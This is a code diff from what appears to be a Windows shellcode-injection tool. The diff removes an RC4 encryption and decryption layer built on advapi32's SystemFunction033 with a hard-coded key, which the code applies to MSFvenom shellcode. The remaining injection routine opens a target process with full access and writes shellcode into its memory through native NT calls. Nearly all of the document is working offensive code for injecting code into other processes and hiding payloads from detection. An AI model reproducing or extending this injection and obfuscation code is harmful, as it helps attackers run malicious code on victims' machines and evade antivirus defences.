@@ -1,55 +1,7 @@
 #include "Box.h"
 
-BOOL EncryptRC4(
-	_In_ CONST PBYTE pShellcode,
-	_In_ CONST SIZE_T sSizeofShellcode
-)
-{
-
-	NTSTATUS STATUS = NULL;
-
-	BYTE _key[] = { 0xDE,0xAD,0xBE,0xEF }; // key used to decrypt and encrypt shellcode
-
-	// ensure everything is working
-	if (!pShellcode || sSizeofShellcode == 0) {
-		WARN("EncryptRC4_SystemFunc: invalid params");
-		return FALSE;
-	}
-
-	DATA_BLOB data_blob = { .cbData = (DWORD)sSizeofShellcode, .pbData = pShellcode };
-	DATA_BLOB key_blob = { .cbData = (DWORD)sizeof(_key), .pbData = _key };
-
-	// SystemFunction033 from advapi32
-	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");
-	if (!SystemFunction033) {
-		WARN("GetProcAddress(SystemFunction033) failed");
-		return FALSE;
-	}
-
-	if ((STATUS = SystemFunction033(&data_blob, &key_blob)) != 0x0)
-	{
-		printf("[!] SystemFunction033 FAILED With Error : 0x%0.8X\n", STATUS);
-		return FALSE;
-	}
-
-	OKAY("Successfully Encrypted MSFvenom Calc Shellcode with RC4");
-
-	// print out encrypted shellcode (skid style)
-	for (DWORD i = 0; i < data_blob.cbData; i++)
-	{
-		if (i % 16 == 0) printf("\n ");
-		Sleep(1);
-		printf(" %02x", data_blob.pbData[i]);
-	}
-
-	printf("\nCurrent RC4 Encrypted Shellcode Address: %p\n", (void*)data_blob.pbData);
-
-	return TRUE;
-}
-
 BOOL NtShellInjection(
 	_In_ CONST DWORD PID,
-	CONST PBYTE pEncryptedShellcode,
 	_In_ CONST PBYTE pShellcode,
 	_In_ CONST SIZE_T sSizeofShellcode
 )
@@ -79,8 +31,6 @@ BOOL NtShellInjection(
 	fn_NtWriteVirtualMemory NtWriteVirtualMemory = (fn_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
 	fn_NtProtectVirtualMemory NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
 	PFN_NtFreeVirtualMemory p_NtFreeVirtualMemory = (PFN_NtFreeVirtualMemory)GetProcAddress(ntdll, "NtFreeVirtualMemory");
-	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");
-
 	
 	STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
 	if (STATUS_SUCCESS != STATUS)
@@ -101,37 +51,8 @@ BOOL NtShellInjection(
 
 	OKAY("Allocated %zu Bytes to Virtual Memory!", sSizeofShellcode);
 
-
-	// Used to decrypt Shellcode
-	PUCHAR localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, sSizeofShellcode);
-	if (!localBuf) {
-		WARN("HeapAlloc failed for localBuf");
-		HeapFree(GetProcessHeap(), 0, localBuf);
-		localBuf = NULL;
-		State = FALSE;
-	}
-	RtlCopyMemory(localBuf, pEncryptedShellcode, sSizeofShellcode);
-
-
-	DATA_BLOB data_local = { .cbData = (DWORD)sSizeofShellcode, .pbData = localBuf };
-
-
-	BYTE local_key_bytes[] = { 0xDE, 0xAD, 0xBE, 0xEF };
-	DATA_BLOB key_local = { .cbData = (DWORD)sizeof(local_key_bytes), .pbData = local_key_bytes };
-
-
-	if ((STATUS = SystemFunction033(&data_local, &key_local)) != 0x0)
-	{
-		printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
-		HeapFree(GetProcessHeap(), 0, localBuf);
-		return FALSE;
-	}
-
-	OKAY("Successfully Decrypted RC4!");
-
-
 	// Write the newly decrypted shellcode inside
-	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, localBuf, origSize, &BytesWritten);
+	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, pShellcode, origSize, &BytesWritten);
 	if (STATUS_SUCCESS != STATUS)
 	{
 		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
